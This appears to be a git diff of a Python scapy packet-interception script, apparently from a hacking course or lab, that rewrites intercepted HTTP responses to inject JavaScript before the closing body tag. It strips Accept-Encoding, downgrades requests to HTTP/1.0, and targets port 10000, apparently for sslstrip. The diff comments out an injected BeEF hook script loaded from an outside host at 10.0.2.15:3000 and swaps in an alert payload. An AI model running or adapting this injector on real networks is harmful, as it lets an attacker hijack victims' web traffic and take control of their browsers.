@@ -20,12 +20,17 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         try:
             load = str(scapy_packet[scapy.Raw].load)
-            if scapy_packet[scapy.TCP].dport == 80:
+            # if scapy_packet[scapy.TCP].dport == 80:
+            if scapy_packet[scapy.TCP].dport == 10000:
                 print("[+] Request")
+                print(scapy_packet.show())
                 load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
-            elif scapy_packet[scapy.TCP].sport == 80:
+                load = load.replace("HTTP/1.1", "HTTP/1.0")
+            # elif scapy_packet[scapy.TCP].sport == 80:
+            elif scapy_packet[scapy.TCP].sport == 10000:
                 print("[+] Response")
-                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
+                # injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'
+                injection_code = '<script>alert("hello");</script>'
                 load = load.replace("</body>", injection_code + "</body>")
                 # load = load.replace("<body>", "<body>" + injection_code)
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
